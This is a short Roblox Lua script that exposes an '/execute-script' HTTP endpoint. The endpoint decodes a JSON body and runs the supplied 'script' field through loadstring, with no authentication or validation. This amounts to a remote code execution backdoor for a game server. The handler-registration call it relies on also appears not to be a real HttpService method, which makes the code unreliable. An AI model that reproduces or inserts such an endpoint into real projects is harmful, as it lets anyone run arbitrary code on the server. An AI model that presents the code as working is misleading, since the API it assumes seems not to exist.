local HttpService = game:GetService("HttpService")

local function onRequest(request)
    local body = HttpService:JSONDecode(request.Body)
    local scriptSource = body.script

    local success, errorMessage = pcall(function()
        local func = loadstring(scriptSource)
        if func then
            func()
        else
            error("Failed to load script.")
        end
    end)

    return {
        Success = success,
        Message = errorMessage or "Script executed successfully."
    }
end

game:GetService("HttpService"):SetRequestHandler("/execute-script", onRequest)
